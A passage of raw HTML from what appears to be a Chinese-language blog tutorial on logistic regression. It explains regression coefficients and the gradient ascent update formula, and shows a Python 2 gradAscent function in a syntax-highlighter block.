id=\"MathJax-Span-131\" class=\"math\"><span id=\"MathJax-Span-132\" class=\"mrow\"><span id=\"MathJax-Span-133\" class=\"msubsup\"><span id=\"MathJax-Span-134\" class=\"mi\">X</span><span id=\"MathJax-Span-135\" class=\"mn\">1</span></span></span></span><span class=\"MJX_Assistive_MathML\">X1</span></span>和<span id=\"MathJax-Element-20-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span id=\"MathJax-Span-136\" class=\"math\"><span id=\"MathJax-Span-137\" class=\"mrow\"><span id=\"MathJax-Span-138\" class=\"msubsup\"><span id=\"MathJax-Span-139\" class=\"mi\">X</span><span id=\"MathJax-Span-140\" class=\"mn\">2</span></span></span></span><span class=\"MJX_Assistive_MathML\">X2</span></span>，一一定义一个回归系数<span id=\"MathJax-Element-21-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span id=\"MathJax-Span-141\" class=\"math\"><span id=\"MathJax-Span-142\" class=\"mrow\"><span id=\"MathJax-Span-143\" class=\"msubsup\"><span id=\"MathJax-Span-144\" class=\"mi\">w</span><span id=\"MathJax-Span-145\" class=\"mn\">0</span></span></span></span><span class=\"MJX_Assistive_MathML\">w0</span></span>、<span id=\"MathJax-Element-22-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span id=\"MathJax-Span-146\" class=\"math\"><span id=\"MathJax-Span-147\" class=\"mrow\"><span id=\"MathJax-Span-148\" class=\"msubsup\"><span id=\"MathJax-Span-149\" class=\"mi\">w</span><span id=\"MathJax-Span-150\" class=\"mn\">1</span></span></span></span><span class=\"MJX_Assistive_MathML\">w1</span></span>和<span id=\"MathJax-Element-23-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span id=\"MathJax-Span-151\" class=\"math\"><span id=\"MathJax-Span-152\" class=\"mrow\"><span id=\"MathJax-Span-153\" class=\"msubsup\"><span id=\"MathJax-Span-154\" class=\"mi\">w</span><span id=\"MathJax-Span-155\" class=\"mn\">2</span></span></span></span><span class=\"MJX_Assistive_MathML\">w2</span></span>，使这个误差减小。即使<span id=\"MathJax-Element-24-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span id=\"MathJax-Span-156\" class=\"math\"><span id=\"MathJax-Span-157\" class=\"mrow\"><span id=\"MathJax-Span-158\" class=\"mi\">z</span><span id=\"MathJax-Span-159\" class=\"mo\">=</span><span id=\"MathJax-Span-160\" class=\"msubsup\"><span id=\"MathJax-Span-161\" class=\"mi\">w</span><span id=\"MathJax-Span-162\" class=\"mn\">0</span></span><span id=\"MathJax-Span-163\" class=\"msubsup\"><span id=\"MathJax-Span-164\" class=\"mi\">x</span><span id=\"MathJax-Span-165\" class=\"mn\">0</span></span><span id=\"MathJax-Span-166\" class=\"mo\">+</span><span id=\"MathJax-Span-167\" class=\"msubsup\"><span id=\"MathJax-Span-168\" class=\"mi\">w</span><span id=\"MathJax-Span-169\" class=\"mn\">1</span></span><span id=\"MathJax-Span-170\" class=\"msubsup\"><span id=\"MathJax-Span-171\" class=\"mi\">x</span><span id=\"MathJax-Span-172\" class=\"mn\">1</span></span><span id=\"MathJax-Span-173\" class=\"mo\">+</span><span id=\"MathJax-Span-174\" class=\"msubsup\"><span id=\"MathJax-Span-175\" class=\"mi\">w</span><span id=\"MathJax-Span-176\" class=\"mn\">2</span></span><span id=\"MathJax-Span-177\" class=\"msubsup\"><span id=\"MathJax-Span-178\" class=\"mi\">x</span><span id=\"MathJax-Span-179\" class=\"mn\">2</span></span></span></span></span></p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1fm60lw5fe7j20a402ajr8.jpg\" width=\"364\" height=\"82\"></p>\n<p>其实不难想象，这组<span id=\"MathJax-Element-26-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-221\" class=\"math\"><span id=\"MathJax-Span-222\" class=\"mrow\"><span id=\"MathJax-Span-223\" class=\"mi\">w</span></span></span><span class=\"MJX_Assistive_MathML\">w</span></span>回归系数的值决定了我们计算结果的准确性，甚至是正确性。也就是说，这组<span id=\"MathJax-Element-27-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-224\" class=\"math\"><span id=\"MathJax-Span-225\" class=\"mrow\"><span id=\"MathJax-Span-226\" class=\"mi\">w</span></span></span><span class=\"MJX_Assistive_MathML\">w</span></span>的值反应了样本空间分类的规则。<br>\n那么，我们在输入一组样本之外的数据时，配合正确的<span id=\"MathJax-Element-28-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-227\" class=\"math\"><span id=\"MathJax-Span-228\" class=\"mrow\"><span id=\"MathJax-Span-229\" class=\"mi\">w</span></span></span><span class=\"MJX_Assistive_MathML\">w</span></span>回归系数，我们就能得到比较接近样本空间分类规则的分类结果。<br>\n问题又来了，我们怎么来得到这样一组<span id=\"MathJax-Element-29-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-230\" class=\"math\"><span id=\"MathJax-Span-231\" class=\"mrow\"><span id=\"MathJax-Span-232\" class=\"mi\">w</span></span></span><span class=\"MJX_Assistive_MathML\">w</span></span>回归系数呢？</p>\n<h2 id=\"title-3\">三、梯度上升法</h2>\n<p>梯度上升法，是在函数的梯度方向上，不断的迭代计算参数值，以找到一个最大的参数值。迭代公式如下：</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fm60lwk7ihj208o01iglf.jpg\" width=\"312\" height=\"54\"></p>\n<p>其中，<span id=\"MathJax-Element-31-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span id=\"MathJax-Span-255\" class=\"math\"><span id=\"MathJax-Span-256\" class=\"mrow\"><span id=\"MathJax-Span-257\" class=\"mi\">α</span></span></span><span class=\"MJX_Assistive_MathML\">α</span></span>为步长，<span id=\"MathJax-Element-32-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span id=\"MathJax-Span-258\" class=\"math\"><span id=\"MathJax-Span-259\" class=\"mrow\"><span id=\"MathJax-Span-260\" class=\"mi\">Δ</span><span id=\"MathJax-Span-261\" class=\"mi\">σ</span><span id=\"MathJax-Span-262\" class=\"mo\">(</span><span id=\"MathJax-Span-263\" class=\"mi\">w</span><span id=\"MathJax-Span-264\" class=\"mo\">)</span></span></span><span class=\"MJX_Assistive_MathML\">Δσ(w)</span></span>为<span id=\"MathJax-Element-33-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px;color: #333333;background-color: #ffffff\"><span id=\"MathJax-Span-265\" class=\"math\"><span id=\"MathJax-Span-266\" class=\"mrow\"><span id=\"MathJax-Span-267\" class=\"mi\">σ</span><span id=\"MathJax-Span-268\" class=\"mo\">(</span><span id=\"MathJax-Span-269\" class=\"mi\">w</span><span id=\"MathJax-Span-270\" class=\"mo\">)</span></span></span><span class=\"MJX_Assistive_MathML\">σ(w)</span></span>函数梯度。关于梯度的推导请参考<a href=\"http://blog.csdn.net/taotaofu/article/details/52831965\">这里</a>。作者的数学能力有限，就不做说明了。<br>\n最后，我们可以得到梯度的计算公式：</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1fm60lwxeqdj20ae02c746.jpg\" width=\"374\" height=\"84\"></p>\n<p>那么，迭代公式如下：</p>\n<p><img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1fm60lx83osj20b502ca9y.jpg\" width=\"401\" height=\"84\"></p>\n<p>公式说明：</p>\n<ul>\n<li><span id=\"MathJax-Element-36-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-354\" class=\"math\"><span id=\"MathJax-Span-355\" class=\"mrow\"><span id=\"MathJax-Span-356\" class=\"msubsup\"><span id=\"MathJax-Span-357\" class=\"mi\">w</span><span id=\"MathJax-Span-358\" class=\"texatom\"><span id=\"MathJax-Span-359\" class=\"mrow\"><span id=\"MathJax-Span-360\" class=\"mi\">k</span><span id=\"MathJax-Span-361\" class=\"mo\">+</span><span id=\"MathJax-Span-362\" class=\"mn\">1</span></span></span></span></span></span><span class=\"MJX_Assistive_MathML\">wk+1</span></span>为本次迭代<span id=\"MathJax-Element-37-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-363\" class=\"math\"><span id=\"MathJax-Span-364\" class=\"mrow\"><span id=\"MathJax-Span-365\" class=\"mi\">X</span></span></span><span class=\"MJX_Assistive_MathML\">X</span></span>特征项的回归系数结果</li>\n<li><span id=\"MathJax-Element-38-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-366\" class=\"math\"><span id=\"MathJax-Span-367\" class=\"mrow\"><span id=\"MathJax-Span-368\" class=\"msubsup\"><span id=\"MathJax-Span-369\" class=\"mi\">w</span><span id=\"MathJax-Span-370\" class=\"mi\">k</span></span></span></span><span class=\"MJX_Assistive_MathML\">wk</span></span>为上一次迭代<span id=\"MathJax-Element-39-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-371\" class=\"math\"><span id=\"MathJax-Span-372\" class=\"mrow\"><span id=\"MathJax-Span-373\" class=\"mi\">X</span></span></span><span class=\"MJX_Assistive_MathML\">X</span></span>特征项的回归系数结果</li>\n<li><span id=\"MathJax-Element-40-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-374\" class=\"math\"><span id=\"MathJax-Span-375\" class=\"mrow\"><span id=\"MathJax-Span-376\" class=\"mi\">α</span></span></span><span class=\"MJX_Assistive_MathML\">α</span></span>为每次迭代向梯度方向移动的步长</li>\n<li><span id=\"MathJax-Element-41-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-377\" class=\"math\"><span id=\"MathJax-Span-378\" class=\"mrow\"><span id=\"MathJax-Span-379\" class=\"msubsup\"><span id=\"MathJax-Span-380\" class=\"mi\">x</span><span id=\"MathJax-Span-381\" class=\"texatom\"><span id=\"MathJax-Span-382\" class=\"mrow\"><span id=\"MathJax-Span-383\" class=\"mi\">i</span></span></span></span></span></span><span class=\"MJX_Assistive_MathML\">xi</span></span>为<span id=\"MathJax-Element-42-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-384\" class=\"math\"><span id=\"MathJax-Span-385\" class=\"mrow\"><span id=\"MathJax-Span-386\" class=\"mi\">X</span></span></span><span class=\"MJX_Assistive_MathML\">X</span></span>特征项中第i个元素</li>\n<li><span id=\"MathJax-Element-43-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-387\" class=\"math\"><span id=\"MathJax-Span-388\" class=\"mrow\"><span id=\"MathJax-Span-389\" class=\"msubsup\"><span id=\"MathJax-Span-390\" class=\"mi\">y</span><span id=\"MathJax-Span-391\" class=\"mi\">i</span></span></span></span><span class=\"MJX_Assistive_MathML\">yi</span></span>是样本中第i条记录的分类样本结果</li>\n<li><span id=\"MathJax-Element-44-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-392\" class=\"math\"><span id=\"MathJax-Span-393\" class=\"mrow\"><span id=\"MathJax-Span-394\" class=\"mi\">σ</span><span id=\"MathJax-Span-395\" class=\"mo\">(</span><span id=\"MathJax-Span-396\" class=\"msubsup\"><span id=\"MathJax-Span-397\" class=\"mi\">x</span><span id=\"MathJax-Span-398\" class=\"mi\">i</span></span><span id=\"MathJax-Span-399\" class=\"mo\">,</span><span id=\"MathJax-Span-400\" class=\"msubsup\"><span id=\"MathJax-Span-401\" class=\"mi\">w</span><span id=\"MathJax-Span-402\" class=\"mi\">k</span></span><span id=\"MathJax-Span-403\" class=\"mo\">)</span></span></span><span class=\"MJX_Assistive_MathML\">σ(xi,wk)</span></span>是样本中第i条记录，使用sigmoid函数和<span id=\"MathJax-Element-45-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-404\" class=\"math\"><span id=\"MathJax-Span-405\" class=\"mrow\"><span id=\"MathJax-Span-406\" class=\"msubsup\"><span id=\"MathJax-Span-407\" class=\"mi\">w</span><span id=\"MathJax-Span-408\" class=\"mi\">k</span></span></span></span><span class=\"MJX_Assistive_MathML\">wk</span></span>作为回归系数计算的分类结果</li>\n<li><span id=\"MathJax-Element-46-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-409\" class=\"math\"><span id=\"MathJax-Span-410\" class=\"mrow\"><span id=\"MathJax-Span-411\" class=\"mo\">[</span><span id=\"MathJax-Span-412\" class=\"msubsup\"><span id=\"MathJax-Span-413\" class=\"mi\">y</span><span id=\"MathJax-Span-414\" class=\"mi\">i</span></span><span id=\"MathJax-Span-415\" class=\"mo\">−</span><span id=\"MathJax-Span-416\" class=\"mi\">σ</span><span id=\"MathJax-Span-417\" class=\"mo\">(</span><span id=\"MathJax-Span-418\" class=\"msubsup\"><span id=\"MathJax-Span-419\" class=\"mi\">x</span><span id=\"MathJax-Span-420\" class=\"mi\">i</span></span><span id=\"MathJax-Span-421\" class=\"mo\">,</span><span id=\"MathJax-Span-422\" class=\"msubsup\"><span id=\"MathJax-Span-423\" class=\"mi\">w</span><span id=\"MathJax-Span-424\" class=\"mi\">k</span></span><span id=\"MathJax-Span-425\" class=\"mo\">)</span><span id=\"MathJax-Span-426\" class=\"mo\">]</span></span></span><span class=\"MJX_Assistive_MathML\">[yi−σ(xi,wk)]</span></span>是样本第i条记录对应的分类结果值,与sigmoid函数使用<span id=\"MathJax-Element-47-Frame\" class=\"MathJax\" style=\"font-family: 'lucida grande', 'lucida sans unicode', lucida, helvetica, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', sans-serif;font-weight: normal;font-size: 18px;line-height: 30px;font-style: normal;text-indent: 0px;text-align: left;letter-spacing: normal;float: none;direction: ltr;max-width: none;max-height: none;min-width: 0px;min-height: 0px;border: 0px;padding: 0px;margin: 0px\"><span id=\"MathJax-Span-427\" class=\"math\"><span id=\"MathJax-Span-428\" class=\"mrow\"><span id=\"MathJax-Span-429\" class=\"msubsup\"><span id=\"MathJax-Span-430\" class=\"mi\">w</span><span id=\"MathJax-Span-431\" class=\"mi\">k</span></span></span></span><span class=\"MJX_Assistive_MathML\">wk</span></span>作为回归系数计算的分类结果值的误差值。</li>\n</ul>\n<p>现在，我们有了计算回归系数的公式，下面我们在logRegres.py文件中来实现一个函数，实现计算样本空间的回归系数，并打印一下我们的结果：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a0cef755772211832\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef gradAscent(dataMatIn, classLabels):\r\n    dataMatrix = mat(dataMatIn)             #100行3列\r\n    #print dataMatrix\r\n    labelMat = mat(classLabels).transpose() #100行1列\r\n    #print 'labelMat:\\n',labelMat\r\n    print 'labelMat 的形状:rowNum=',shape(labelMat)[0],'colNum=',shape(labelMat)[1]\r\n    rowNum,colNum = shape(dataMatrix)\r\n    alpha = 0.001\r\n    maxCycles = 500\r\n    weights = ones((colNum,1))  #3行1列\r\n    #print shape(dataMatrix)\r\n    #print shape(weights)\r\n    #print shape(labelMat)\r\n    for k in range(maxCycles):              #heavy on matrix operations\r\n        h = sigmoid(dataMatrix*weights)     #100行1列\r\n        #print h\r\n        error = (labelMat - h)              #vector subtraction\r\n        weights = weights + alpha * dataMatrix.transpose()* error #3行1列\r\n    return weights\r\nif __name__=='__main__':\r\n    dataMat,labelMat=loadDataSet()\r\n    #weights=gradAscent(dataMat,labelMat)\r\n    #print 'dataMat:\\n',dataMat\r\n    #print 'labelMat:\\n',labelMat\r\n    print weights</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef755772211832-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef755772211832-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef755772211832-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef755772211832-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef755772211832-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef755772211832-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef755772211832-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef755772211832-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef755772211832-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef755772211832-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef755772211832-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a0cef755772211832-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a0cef755772211832-25\">25</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a0cef755772211832-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">gradAscent</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMatIn</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">classLabels</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a0cef755772211832-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">dataMatrix</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mat</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">dataMatIn</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">             </span><span class=\"crayon-p\">#100行3列</span></div><div class=\"crayon-line\" 